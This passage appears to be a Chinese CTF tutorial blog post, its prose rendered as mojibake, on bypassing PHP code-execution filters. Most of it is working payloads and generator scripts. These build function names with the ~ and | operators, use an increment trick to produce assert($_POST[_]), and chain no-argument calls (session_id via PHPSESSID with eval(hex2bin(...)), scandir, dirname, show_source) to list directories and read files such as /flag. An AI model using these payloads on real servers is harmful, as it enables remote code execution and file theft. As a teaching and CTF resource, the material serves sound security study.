<h2 id="å–å"><a href="#å–å" class="headerlink" title="å–å"></a>å–å</h2><p>ä¾‹å­</p>
<figure class="highlight haml"><table><tr><td class="code"><pre><code class="hljs haml"><span class="hljs-tag">%<span class="hljs-selector-tag">8C</span></span>-10001100<br>é€ä½å–å<br><span class="hljs-tag">%<span class="hljs-selector-tag">73</span></span>-01110011<br></code></pre></td></tr></table></figure>

<p>åˆ©ç”¨phpçš„å–åç¬¦å·<code>~</code>æ¥æ„é€ ä»»æ„å­—æ¯</p>
<p>yuå¸ˆå‚…è„šæœ¬</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//åœ¨å‘½ä»¤è¡Œä¸­è¿è¡Œ</span><br><span class="hljs-comment">/*author yu22x*/</span><br><br><span class="hljs-title function_ invoke__">fwrite</span>(STDOUT,<span class="hljs-string">&#x27;[+]your function: &#x27;</span>);<br><span class="hljs-variable">$system</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;\r\n&quot;</span>, <span class="hljs-string">&quot;\r&quot;</span>, <span class="hljs-string">&quot;\n&quot;</span>), <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-title function_ invoke__">fgets</span>(STDIN));<br><span class="hljs-title function_ invoke__">fwrite</span>(STDOUT,<span class="hljs-string">&#x27;[+]your command: &#x27;</span>);<br><span class="hljs-variable">$command</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;\r\n&quot;</span>, <span class="hljs-string">&quot;\r&quot;</span>, <span class="hljs-string">&quot;\n&quot;</span>), <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-title function_ invoke__">fgets</span>(STDIN));<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;[*] (~&#x27;</span>.<span class="hljs-title function_ invoke__">urlencode</span>(~<span class="hljs-variable">$system</span>).<span class="hljs-string">&#x27;)(~&#x27;</span>.<span class="hljs-title function_ invoke__">urlencode</span>(~<span class="hljs-variable">$command</span>).<span class="hljs-string">&#x27;);&#x27;</span>;<br></code></pre></td></tr></table></figure>

<h2 id="æˆ–or"><a href="#æˆ–or" class="headerlink" title="æˆ–or"></a>æˆ–or</h2><p>åŸç†ä¸å¼‚æˆ–ä¸€è‡´ï¼Œåˆ©ç”¨ç¬¦å·<code>|</code>æ¥æ„é€ </p>
<p>æˆ–è¿ç®—å°±æ˜¯æœ‰ä¸€ä¸ºä¸€ï¼Œéƒ½æ˜¯é›¶å°±æ˜¯é›¶ï¼Œæ¯”å¦‚è¯´<code>3|10</code>ï¼Œå°±æ˜¯<code>0011|1010</code>ï¼Œç»“æœä¸º<code>1011</code></p>
<p>è„šæœ¬</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/* author yu22x */</span><br><br><span class="hljs-variable">$myfile</span> = <span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&quot;or_rce.txt&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>);<br><span class="hljs-variable">$contents</span>=<span class="hljs-string">&quot;&quot;</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-number">256</span>; <span class="hljs-variable">$i</span>++) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-variable">$j</span>=<span class="hljs-number">0</span>; <span class="hljs-variable">$j</span> &lt;<span class="hljs-number">256</span> ; <span class="hljs-variable">$j</span>++) &#123;<br><br>                <span class="hljs-keyword">if</span>(<span class="hljs-variable">$i</span>&lt;<span class="hljs-number">16</span>)&#123;<br>                        <span class="hljs-variable">$hex_i</span>=<span class="hljs-string">&#x27;0&#x27;</span>.<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$i</span>);<br>                &#125;<br>                <span class="hljs-keyword">else</span>&#123;<br>                        <span class="hljs-variable">$hex_i</span>=<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$i</span>);<br>                &#125;<br>                <span class="hljs-keyword">if</span>(<span class="hljs-variable">$j</span>&lt;<span class="hljs-number">16</span>)&#123;<br>                        <span class="hljs-variable">$hex_j</span>=<span class="hljs-string">&#x27;0&#x27;</span>.<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$j</span>);<br>                &#125;<br>                <span class="hljs-keyword">else</span>&#123;<br>                        <span class="hljs-variable">$hex_j</span>=<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$j</span>);<br>                &#125;<br>                <span class="hljs-variable">$preg</span> = <span class="hljs-string">&#x27;/[0-9a-z]/i&#x27;</span>;<span class="hljs-comment">//æ ¹æ®é¢˜ç›®ç»™çš„æ­£åˆ™è¡¨è¾¾å¼ä¿®æ”¹å³å¯</span><br>                <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-variable">$preg</span> , <span class="hljs-title function_ invoke__">hex2bin</span>(<span class="hljs-variable">$hex_i</span>))||<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-variable">$preg</span> , <span class="hljs-title function_ invoke__">hex2bin</span>(<span class="hljs-variable">$hex_j</span>)))&#123;<br>                                        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&quot;</span>;<br>    &#125;<br><br>                <span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-variable">$a</span>=<span class="hljs-string">&#x27;%&#x27;</span>.<span class="hljs-variable">$hex_i</span>;<br>                <span class="hljs-variable">$b</span>=<span class="hljs-string">&#x27;%&#x27;</span>.<span class="hljs-variable">$hex_j</span>;<br>                <span class="hljs-variable">$c</span>=(<span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$a</span>)|<span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$b</span>));<br>                <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$c</span>)&gt;=<span class="hljs-number">32</span>&amp;<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$c</span>)&lt;=<span class="hljs-number">126</span>) &#123;<br>                        <span class="hljs-variable">$contents</span>=<span class="hljs-variable">$contents</span>.<span class="hljs-variable">$c</span>.<span class="hljs-string">&quot; &quot;</span>.<span class="hljs-variable">$a</span>.<span class="hljs-string">&quot; &quot;</span>.<span class="hljs-variable">$b</span>.<span class="hljs-string">&quot;\n&quot;</span>;<br>                &#125;<br>        &#125;<br><br>&#125;<br>&#125;<br><span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$myfile</span>,<span class="hljs-variable">$contents</span>);<br><span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$myfile</span>);<br></code></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><br><span class="hljs-comment"># author yu22x</span><br><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> urllib<br><span class="hljs-keyword">from</span> sys <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">action</span>(<span class="hljs-params">arg</span>):<br>   s1=<span class="hljs-string">&quot;&quot;</span><br>   s2=<span class="hljs-string">&quot;&quot;</span><br>   <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> arg:<br>       f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;or_rce.txt&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>)<br>       <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>           t=f.readline()<br>           <span class="hljs-keyword">if</span> t==<span class="hljs-string">&quot;&quot;</span>:<br>               <span class="hljs-keyword">break</span><br>           <span class="hljs-keyword">if</span> t[<span class="hljs-number">0</span>]==i:<br>               <span class="hljs-comment">#print(i)</span><br>               s1+=t[<span class="hljs-number">2</span>:<span class="hljs-number">5</span>]<br>               s2+=t[<span class="hljs-number">6</span>:<span class="hljs-number">9</span>]<br>               <span class="hljs-keyword">break</span><br>       f.close()<br>   output=<span class="hljs-string">&quot;(\&quot;&quot;</span>+s1+<span class="hljs-string">&quot;\&quot;|\&quot;&quot;</span>+s2+<span class="hljs-string">&quot;\&quot;)&quot;</span><br>   <span class="hljs-keyword">return</span>(output)<br>   <br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>   param=action(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;\n[+] your functionï¼š&quot;</span>) )+action(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;[+] your commandï¼š&quot;</span>))+<span class="hljs-string">&quot;;&quot;</span><br>   <span class="hljs-built_in">print</span>(param)<br><br><br></code></pre></td></tr></table></figure>


<h2 id="è‡ªå¢"><a href="#è‡ªå¢" class="headerlink" title="è‡ªå¢"></a>è‡ªå¢</h2><p>åˆ©ç”¨PHPä¸­çš„<a href="https://www.php.net/manual/zh/language.operators.increment.php">é€’å¢&#x2F;é€’å‡è¿ç®—ç¬¦</a>ï¼Œä¹Ÿå°±æ˜¯è¯´<code>&#39;a&#39;++ =&gt; &#39;b&#39;</code></p>
<p>ç„¶ååˆ©ç”¨phpå¼ºåˆ¶è¾“å‡ºæ•°ç»„æ—¶ï¼Œæ•°ç»„ä¼šè¢«è½¬æ¢æˆå­—ç¬¦ä¸²<code>Array</code>ï¼Œæ‹¿åˆ°<code>A</code></p>
<p><img src="/img/summary/rce-18.png"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//æµ‹è¯•å‘ç°7.0.12ä»¥ä¸Šç‰ˆæœ¬ä¸å¯ä½¿ç”¨</span><br><span class="hljs-comment">//ä½¿ç”¨æ—¶éœ€è¦urlç¼–ç ä¸‹</span><br><span class="hljs-variable">$_</span>=[];<span class="hljs-variable">$_</span>=@<span class="hljs-string">&quot;<span class="hljs-subst">$_</span>&quot;</span>;<span class="hljs-variable">$_</span>=<span class="hljs-variable">$_</span>[<span class="hljs-string">&#x27;!&#x27;</span>==<span class="hljs-string">&#x27;@&#x27;</span>];<span class="hljs-variable">$___</span>=<span class="hljs-variable">$_</span>;<span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$___</span>.=<span class="hljs-variable">$__</span>;<span class="hljs-variable">$___</span>.=<span class="hljs-variable">$__</span>;<span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$___</span>.=<span class="hljs-variable">$__</span>;<span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$___</span>.=<span class="hljs-variable">$__</span>;<span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$___</span>.=<span class="hljs-variable">$__</span>;<span class="hljs-variable">$____</span>=<span class="hljs-string">&#x27;_&#x27;</span>;<span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$____</span>.=<span class="hljs-variable">$__</span>;<span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$____</span>.=<span class="hljs-variable">$__</span>;<span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$____</span>.=<span class="hljs-variable">$__</span>;<span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$____</span>.=<span class="hljs-variable">$__</span>;<span class="hljs-variable">$_</span>=<span class="hljs-variable">$$____</span>;<span class="hljs-variable">$___</span>(<span class="hljs-variable">$_</span>[_]);<br>å›ºå®šæ ¼å¼ æ„é€ å‡ºæ¥çš„ <span class="hljs-title function_ invoke__">assert</span>(<span class="hljs-variable">$_POST</span>[_]);<br>ç„¶åpostä¼ å…¥   _=<span class="hljs-title function_ invoke__">phpinfo</span>();<br></code></pre></td></tr></table></figure>

<p>CTFSHOWæ— å­—ç¬¦RCEæŒ‘æˆ˜ä¸­æœ‰æ›´æ·±å…¥çš„åˆ©ç”¨æ–¹æ³•</p>
<h1 id="æ— å‚RCE"><a href="#æ— å‚RCE" class="headerlink" title="æ— å‚RCE"></a>æ— å‚RCE</h1><p>ç»å…¸æ­£åˆ™ï¼Œä¸èƒ½ä½¿ç”¨å¸¦å‚æ•°çš„å‡½æ•°</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-string">&#x27;;&#x27;</span> === <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;code&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;code&#x27;</span>]);<br>&#125;<br></code></pre></td></tr></table></figure>


<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">end</span>() â€” å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„æœ€åä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡º<br><span class="hljs-title function_ invoke__">next</span>() â€” å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„ä¸‹ä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡º<br><span class="hljs-title function_ invoke__">prev</span>() â€” å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„ä¸Šä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡º<br><span class="hljs-title function_ invoke__">reset</span>() â€” å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„ç¬¬ä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡º<br><span class="hljs-title function_ invoke__">each</span>() â€” è¿”å›å½“å‰å…ƒç´ çš„é”®åå’Œé”®å€¼ï¼Œå¹¶å°†å†…éƒ¨æŒ‡é’ˆå‘å‰ç§»åŠ¨<br><span class="hljs-title function_ invoke__">current</span>() â€” è¿”å›æ•°ç»„ä¸­çš„å½“å‰å€¼<br><span class="hljs-title function_ invoke__">array_reverse</span>() â€” è¿”å›å•å…ƒé¡ºåºç›¸åçš„æ•°ç»„<br><span class="hljs-title function_ invoke__">getcwd</span>() â€” å–å¾—å½“å‰å·¥ä½œç›®å½•<br><span class="hljs-title function_ invoke__">array_rand</span>() â€” è¿”å›ä¸€ä¸ªåŒ…å«éšæœºé”®åçš„æ•°ç»„<br><span class="hljs-title function_ invoke__">hex2bin</span>() â€” æŠŠåå…­è¿›åˆ¶å€¼è½¬æ¢ä¸º ASCII å­—ç¬¦<br></code></pre></td></tr></table></figure>

<h2 id="getallheaders"><a href="#getallheaders" class="headerlink" title="getallheaders()"></a>getallheaders()</h2><p>è·å–å…¨éƒ¨HTTPè¯·æ±‚å¤´ä¿¡æ¯</p>
<p>å¯ä»¥é€šè¿‡var_dump(getallheaders());æ¥è¾“å‡ºè¯·æ±‚å¤´ä¿¡æ¯ï¼Œç„¶åé€šè¿‡nextï¼Œendç­‰æ¥æ§åˆ¶å­—ç¬¦ä¸²ä½ç½®</p>
<h2 id="get-defined-vars"><a href="#get-defined-vars" class="headerlink" title="get_defined_vars()"></a>get_defined_vars()</h2><p>è¿”å›ç”±æ‰€æœ‰å·²å®šä¹‰å˜é‡æ‰€ç»„æˆçš„æ•°ç»„</p>
<p>è¿”å›æ•°ç»„é¡ºåºä¸ºget-&gt;post-&gt;cookie-&gt;files</p>
<h2 id="session-start"><a href="#session-start" class="headerlink" title="session_start()"></a>session_start()</h2><p>php7ä»¥ä¸‹é€‚ç”¨</p>
<p>å› ä¸ºPHPSESSIDçš„ç»„æˆç¬¦å·æœ‰é™å®šï¼Œæ‰€ä»¥ä¸èƒ½æœ‰()</p>
<p>è¯»æ–‡ä»¶</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php">GET /?code=<span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-title function_ invoke__">session_id</span>(<span class="hljs-title function_ invoke__">session_start</span>())); HTTP/<span class="hljs-number">1.1</span><br>Cookie: PHPSESSID=/flag<br></code></pre></td></tr></table></figure>

<p>æˆ–è€…è½¬æˆ16è¿›åˆ¶</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">bin2hex</span>(<span class="hljs-string">&#x27;phpinfo();&#x27;</span>);  <span class="hljs-comment">//706870696e666f28293b</span><br></code></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php">GET /?code=<span class="hljs-keyword">eval</span>(<span class="hljs-title function_ invoke__">hex2bin</span>(<span class="hljs-title function_ invoke__">session_id</span>(<span class="hljs-title function_ invoke__">session_start</span>()))); HTTP/<span class="hljs-number">1.1</span><br>Cookie: PHPSESSID=<span class="hljs-number">706870696e666</span>f28293b<br></code></pre></td></tr></table></figure>



<h2 id="scandir"><a href="#scandir" class="headerlink" title="scandir()"></a>scandir()</h2><p>ä¸€äº›payload</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//æŸ¥çœ‹å½“å‰ç›®å½•ä¸‹çš„æ–‡ä»¶</span><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-title function_ invoke__">getcwd</span>()));<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-title function_ invoke__">current</span>(<span class="hljs-title function_ invoke__">localeconv</span>())));<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-title function_ invoke__">ceil</span>(<span class="hljs-title function_ invoke__">sinh</span>(<span class="hljs-title function_ invoke__">cosh</span>(<span class="hljs-title function_ invoke__">tan</span>(<span class="hljs-title function_ invoke__">floor</span>(<span class="hljs-title function_ invoke__">sqrt</span>(<span class="hljs-title function_ invoke__">floor</span>(<span class="hljs-title function_ invoke__">phpversion</span>()))))))))));    <span class="hljs-comment">//åˆ©ç”¨ä¸‰è§’å‡½æ•°å’Œfloor ceilï¼Œè¿™ä¸ªæ˜¯php7ä¸‹èƒ½å¤ŸæˆåŠŸ</span><br><br><span class="hljs-comment">//å½“å‰ç›®å½•å€’æ•°ç¬¬ä¸€ä½æ–‡ä»¶ï¼š</span><br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-title function_ invoke__">end</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-title function_ invoke__">getcwd</span>())));<br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-title function_ invoke__">current</span>(<span class="hljs-title function_ invoke__">array_reverse</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-title function_ invoke__">getcwd</span>()))));<br><br><span class="hljs-comment">//å½“å‰ç›®å½•å€’æ•°ç¬¬äºŒä½æ–‡ä»¶ï¼š</span><br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-title function_ invoke__">next</span>(<span class="hljs-title function_ invoke__">array_reverse</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-title function_ invoke__">getcwd</span>()))));<br><br><span class="hljs-comment">//éšæœºè¿”å›å½“å‰ç›®å½•æ–‡ä»¶ï¼š</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-title function_ invoke__">array_rand</span>(<span class="hljs-title function_ invoke__">array_flip</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-title function_ invoke__">getcwd</span>()))));<br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-title function_ invoke__">array_rand</span>(<span class="hljs-title function_ invoke__">array_flip</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-title function_ invoke__">getcwd</span>()))));<br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-title function_ invoke__">array_rand</span>(<span class="hljs-title function_ invoke__">array_flip</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-title function_ invoke__">current</span>(<span class="hljs-title function_ invoke__">localeconv</span>())))));<br><br><span class="hljs-comment">//æŸ¥çœ‹ä¸Šä¸€çº§ç›®å½•æ–‡ä»¶å</span><br><span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-title function_ invoke__">dirname</span>(<span class="hljs-title function_ invoke__">getcwd</span>())));<br><span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-title function_ invoke__">next</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-title function_ invoke__">getcwd</span>()))));<br><span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-title function_ invoke__">next</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-title function_ invoke__">getcwd</span>()))));<br><br><span class="hljs-comment">//è¯»å–ä¸Šçº§ç›®å½•æ–‡ä»¶</span><br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-title function_ invoke__">array_rand</span>(<span class="hljs-title function_ invoke__">array_flip</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-title function_ invoke__">dirname</span>(<span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-title function_ invoke__">dirname</span>(<span class="hljs-title function_ invoke__">getcwd</span>())))))));<br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-title function_ invoke__">array_rand</span>(<span class="hljs-title function_ invoke__">array_flip</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-title function_ invoke__">hebrevc</span>(<span class="hljs-title function_ invoke__">crypt</span>(<span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-title function_ invoke__">next</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-title function_ invoke__">getcwd</span>())))))))))));<br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-title function_ invoke__">array_rand</span>(<span class="hljs-title function_ invoke__">array_flip</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-title function_ invoke__">hebrevc</span>(<span class="hljs-title function_ invoke__">crypt</span>(<span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-title function_ invoke__">next</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-title function_ invoke__">hebrevc</span>(<span class="hljs-title function_ invoke__">crypt</span>(<span class="hljs-title function_ invoke__">phpversion</span>())))))))))))))));<br><br><span class="hljs-comment">//æŸ¥çœ‹å’Œè¯»å–æ ¹ç›®å½•æ–‡ä»¶ï¼ˆæ‰€è·å¾—çš„å­—ç¬¦ä¸²ç¬¬ä¸€ä½æœ‰å‡ ç‡æ˜¯/ï¼Œéœ€è¦å¤šè¯•å‡ æ¬¡ï¼‰</span><br><span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-title function_ invoke__">strrev</span>(<span class="hljs-title function_ invoke__">crypt</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">array</span>())))))));<br></code></pre></td></tr></table></figure>

<h2 id="dirname"><a href="#dirname" class="headerlink" title="dirname()"></a>dirname()</h2><p>phpç‰¹æ€§1ï¼šå¯¹ç›®å½•å–ç›®å½•ä¼šå¾—åˆ°ä¸Šçº§ç›®å½•</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//  /var/www/html</span><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">getcwd</span>());<br><br><span class="hljs-comment">//  /var/www</span><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">dirname</span>(<span class="hljs-title function_ invoke__">getcwd</span>()));<br><br><span class="hljs-comment">//  åˆ—å‡º/ç›®å½•æ–‡ä»¶</span><br><span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-title function_ invoke__">dirname</span>(<span class="hljs-title function_ invoke__">dirname</span>(<span class="hljs-title function_ invoke__">dirname</span>(<span class="hljs-title function_ invoke__">getcwd</span>())))));<br></code></pre></td></tr></table></figure>

<p>phpç‰¹æ€§2ï¼šreadfileå’Œshow_sourceçš„ç‰¹ç‚¹</p>
